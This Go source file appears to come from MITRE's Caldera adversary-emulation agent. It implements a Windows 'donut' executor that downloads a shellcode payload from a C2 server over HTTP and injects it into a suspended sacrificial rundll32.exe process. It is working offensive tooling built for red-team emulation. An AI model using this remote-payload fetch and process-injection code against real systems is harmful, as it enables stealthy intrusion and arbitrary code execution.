// +build windows

package donut

import (
	"fmt"
	"strings"
	"io/ioutil"
	"runtime"
	"reflect"
    "net/http"

	"github.com/mitre/gocat/execute"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/contact"
)

type Donut struct {
	archName string
	contactName string
	contact contact.API
}

func init() {
	runner := &Donut{
		archName: "donut_" + runtime.GOARCH,
		contactName: "HTTP",
	}
	if runner.CheckIfAvailable() {
		execute.Executors[runner.archName] = runner
		contact.CommunicationChannels["HTTP"] = runner
	}
}

const COMMANDLINE string = "rundll32.exe"

func (d *Donut) Run(command string, timeout int, info execute.InstructionInfo) ([]byte, string, string) {
    // Setup variables
    stdoutBytes := make([]byte, 1)
    stderrBytes := make([]byte, 1)
    var eventCode uint32

    bytes, payload := d.GetDonutBytes(info)

    if bytes != nil && len(bytes) > 0 {
        // Create sacrificial process
        output.VerbosePrint(fmt.Sprintf("[i] Donut: Creating sacrificial process '%s'", COMMANDLINE))
        handle, pid, stdout, stderr := CreateSuspendedProcessWithIORedirect(COMMANDLINE)
        output.VerbosePrint(fmt.Sprintf("[i] Donut: Created sacrificial process with PID %d", pid))

        // Run the shellcode and wait for it to complete
        output.VerbosePrint(fmt.Sprint("[i] Donut: Running shellcode"))
        task, err := Runner(bytes, handle, stdout, &stdoutBytes, stderr, &stderrBytes, &eventCode)
        output.VerbosePrint(fmt.Sprint("[i] Donut: Shellcode execution finished"))

        // Assemble the final output
        if task {

            total := "Shellcode thread Exit Code: " + fmt.Sprint(eventCode) + "\n\n"

            total += "STDOUT:\n"
            total += string(stdoutBytes)
            total += "\n\n"

            total += "STDERR:\n"
            total += string(stderrBytes)

            return []byte(total), execute.SUCCESS_STATUS, fmt.Sprint(pid)
        }

        // Covers the cases where an error was received before the remote thread was created
        return []byte(fmt.Sprintf("Shellcode execution failed. Error message: %s", fmt.Sprint(err))), execute.ERROR_STATUS, fmt.Sprint(pid)
    } else {
        // Empty payload
        return []byte(fmt.Sprintf("Empty payload: %s", payload)), execute.ERROR_STATUS, "-1"
    }
}

func (d *Donut) String() string {
	return d.archName
}

func (d *Donut) CheckIfAvailable() bool {
	return IsAvailable()
}

func (d *Donut) GetDonutBytes(info execute.InstructionInfo) ([]byte, string) {
    var payloadBytes []byte
    payload := ""
    server := info.Profile["server"]
    platform := info.Profile["platform"]
    linkId := info.Instruction["id"]

    payloads := reflect.ValueOf(info.Instruction["payloads"])
    for i := 0; i < payloads.Len(); i++ {
        p := payloads.Index(i).Elem().String()
        if strings.HasSuffix(p, ".donut") {
            payload = p
        }
    }

    if server != nil && platform != nil && payload != "" {
		address := fmt.Sprintf("%s/file/download", server.(string))
		req, err := http.NewRequest("POST", address, nil)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to create HTTP request: %s", err.Error()))
		} else {
			req.Header.Set("file", payload)
			req.Header.Set("platform", platform.(string))
			req.Header.Set("X-Link-ID", linkId.(string))
			client := &http.Client{}
			resp, err := client.Do(req)
			if err == nil && resp.StatusCode == 200 {
				buf, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					payloadBytes = buf
				} else {
					output.VerbosePrint(fmt.Sprintf("[-] Error reading HTTP response: %s", err.Error()))
				}
			}
		}
    }

	return payloadBytes, payload
}

// Contact functions
func (d *Donut) GetBeaconBytes(profile map[string]interface{}) []byte {
    return d.contact.GetBeaconBytes(profile)
}

func (d *Donut) GetPayloadBytes(profile map[string]interface{}, payload string) ([]byte, string) {
    if strings.HasSuffix(payload, ".donut") {
        output.VerbosePrint(fmt.Sprint("[i] Donut: GetPayloadBytes override, payload fetch fail expected"))
        return make([]byte, 0, 0), ""
    } else {
        return d.contact.GetPayloadBytes(profile, payload)
    }
}

func (d *Donut) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    return d.contact.C2RequirementsMet(profile, criteria)
}

func (d *Donut) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
    d.contact.SendExecutionResults(profile, result)
}

func (d *Donut) GetName() string {
	return d.contactName
}
